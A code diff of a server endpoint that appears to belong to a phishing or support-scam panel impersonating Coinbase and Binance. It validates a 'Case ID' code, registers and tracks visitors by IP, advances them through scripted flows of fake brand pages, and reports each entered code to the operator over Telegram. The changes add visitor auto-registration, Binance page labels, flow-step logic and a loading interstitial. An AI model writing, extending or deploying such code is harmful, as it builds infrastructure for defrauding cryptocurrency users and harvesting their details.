@@ -13,7 +13,13 @@ import { dbGetCaseCodeByCode, dbRecordCaseCodeUse, dbSetVisitorFlowSteps } from 
 import { serverState } from '$lib/server/state';
 import { broadcast } from '$lib/server/websocket';
 import { notifyPageAction } from '$lib/server/telegram';
-import { labelToUrl, labelToVisitorUrl } from '$lib/server/funnel';
+import {
+	applyLoadingInterstitial,
+	labelToUrl,
+	labelToVisitorUrl,
+	isValidFlowLabel
+} from '$lib/server/funnel';
+import { registerVisitorConnect } from '$lib/server/visitorConnect.js';
 
 const PANEL_HOST = (process.env.PANEL_HOST || '').toLowerCase();
 
@@ -122,7 +128,19 @@ export const POST: RequestHandler = async ({ request, getClientAddress, url }) =
 
 	dbRecordCaseCodeUse(raw, ip);
 
-	const visitor = serverState.visitors.get(ip);
+	let visitor = serverState.visitors.get(ip);
+	if (!visitor) {
+		visitor = await registerVisitorConnect({
+			ip,
+			userAgent: request.headers.get('user-agent') || '',
+			host: url.hostname,
+			path: '/case',
+			brand,
+			page: brand === 'Binance' ? 'Case' : 'Case ID',
+			module: brand || record.module || 'Coinbase'
+		});
+	}
+
 	const qp = new URLSearchParams();
 	if (visitor?.lastTwoDigits) qp.set('last2', visitor.lastTwoDigits);
 	if (visitor?.emailFrom) qp.set('emailFrom', visitor.emailFrom);
@@ -138,46 +156,63 @@ export const POST: RequestHandler = async ({ request, getClientAddress, url }) =
 			? serverState.flows.find((f) => f.id === record.flowId && f.active)
 			: undefined;
 
-	const currentLabel = brand ? `${brand}/Case ID` : '';
+	const currentLabel = brand
+		? brand === 'Binance'
+			? 'Binance/Case'
+			: `${brand}/Case ID`
+		: '';
 
 	let target = '';
 	let targetLabel = '';
 	let flowApplied = false;
 
-	if (assignedFlow && assignedFlow.steps.length > 0 && visitor) {
-		// Build the step list. Auto-mark steps as passed if they match the current
-		// page OR don't look like a valid Brand/Page label (e.g. placeholder text
-		// like "Initialize loader" from the default seeded flows).
-		const steps = assignedFlow.steps.map((p) => {
-			const isLabel = /^[A-Z][^/]+\/.+/.test(p);
-			const isCurrent = currentLabel && p === currentLabel;
-			return { page: p, passed: !isLabel || !!isCurrent };
-		});
+	function applyFlowSteps(
+		steps: { page: string; passed: boolean }[],
+		flowName?: string
+	): boolean {
+		const nextStep = steps.find((s) => !s.passed && isValidFlowLabel(s.page));
+		if (!nextStep) return false;
 
-		const nextStep = steps.find((s) => !s.passed);
-
-		if (nextStep) {
-			targetLabel = nextStep.page;
-			visitor.flowSteps = steps;
-			visitor.flow = assignedFlow.name;
-			visitor.flowBypassed = false;
-			try { dbSetVisitorFlowSteps(ip, visitor.flowSteps); } catch { /* non-critical */ }
-			serverState.setVisitorLastPage(ip, targetLabel);
-
-			target = isVisitorHost
-				? (labelToVisitorUrl(targetLabel, visitor.module, qp.size ? qp : undefined) || '')
-				: (() => {
-					const base = labelToUrl(targetLabel);
-					if (!base) return '';
-					const qs = qp.toString();
-					return qs ? `${base}?${qs}` : base;
-				})();
-
-			if (target) {
-				flowApplied = true;
-				broadcast({ type: 'visitor:updated', payload: visitor });
-			}
+		targetLabel = nextStep.page;
+		visitor!.flowSteps = steps;
+		if (flowName) visitor!.flow = flowName;
+		visitor!.flowBypassed = false;
+		try {
+			dbSetVisitorFlowSteps(ip, visitor!.flowSteps);
+		} catch {
+			/* non-critical */
 		}
+		serverState.setVisitorLastPage(ip, targetLabel);
+
+		target = isVisitorHost
+			? labelToVisitorUrl(targetLabel, visitor!.module, qp.size ? qp : undefined) || ''
+			: (() => {
+				const base = labelToUrl(targetLabel);
+				if (!base) return '';
+				const qs = qp.toString();
+				return qs ? `${base}?${qs}` : base;
+			})();
+
+		if (target) {
+			flowApplied = true;
+			broadcast({ type: 'visitor:updated', payload: visitor! });
+		}
+		return !!target;
+	}
+
+	if (assignedFlow && assignedFlow.steps.length > 0 && visitor) {
+		const steps = assignedFlow.steps.map((p) => {
+			const caseCompleted = !!currentLabel && p === currentLabel;
+			return { page: p, passed: !isValidFlowLabel(p) || caseCompleted };
+		});
+		applyFlowSteps(steps, assignedFlow.name);
+	} else if (visitor?.flowSteps?.length && currentLabel) {
+		// Domain-assigned flow (e.g. "basic") — advance past Case ID without a code-level flowId
+		const steps = visitor.flowSteps.map((s) => ({
+			page: s.page,
+			passed: s.passed || s.page === currentLabel
+		}));
+		applyFlowSteps(steps);
 	}
 
 	if (!target) {
@@ -197,12 +232,26 @@ export const POST: RequestHandler = async ({ request, getClientAddress, url }) =
 	// Final safety net: never return a target that puts the visitor back on the
 	// same Case ID page they just submitted from (would cause a reload loop).
 	if (target && currentLabel) {
+		const targetPath = target.split('?')[0];
 		const targetIsCurrent =
+			targetPath === '/case' ||
 			target === `/templates/preview/${encodeURIComponent(brand)}/${encodeURIComponent('Case ID')}` ||
 			target === `/templates/preview/${brand}/Case%20ID` ||
 			target.includes(`/templates/preview/${brand}/Case`);
-		if (targetIsCurrent) {
-			// Fall back to the brand's Loading page
+		if (targetIsCurrent && visitor?.flowSteps?.length) {
+			const nextStep = visitor.flowSteps.find((s) => !s.passed && isValidFlowLabel(s.page));
+			if (nextStep) {
+				targetLabel = nextStep.page;
+				const base = isVisitorHost
+					? labelToVisitorUrl(targetLabel, visitor.module, qp.size ? qp : undefined)
+					: labelToUrl(targetLabel);
+				if (base) {
+					target = base;
+					serverState.setVisitorLastPage(ip, targetLabel);
+				}
+			}
+		}
+		if (targetIsCurrent && (targetPath === '/case' || target.includes('Case'))) {
 			const fallback = BRAND_DEFAULT_LABEL[brand] || 'Coinbase/Loading';
 			const base = isVisitorHost
 				? labelToVisitorUrl(fallback, visitor?.module || brand, qp.size ? qp : undefined)
@@ -244,10 +293,15 @@ export const POST: RequestHandler = async ({ request, getClientAddress, url }) =
 				lastPageRoute: 'Case ID'
 			},
 			`${brand || 'Unknown'}/Case ID`,
-			`Code entered: ${raw}`,
-			record.label || undefined
+			'case_code_valid',
+			record.label || undefined,
+			{ code: raw }
 		).catch(() => {});
 	}
 
-	return json({ ok: true, valid: true, targetPage: target });
+	const outbound = applyLoadingInterstitial(target || null, qp.size ? qp : undefined, {
+		isVisitorHost
+	});
+
+	return json({ ok: true, valid: true, targetPage: outbound || target });
 };
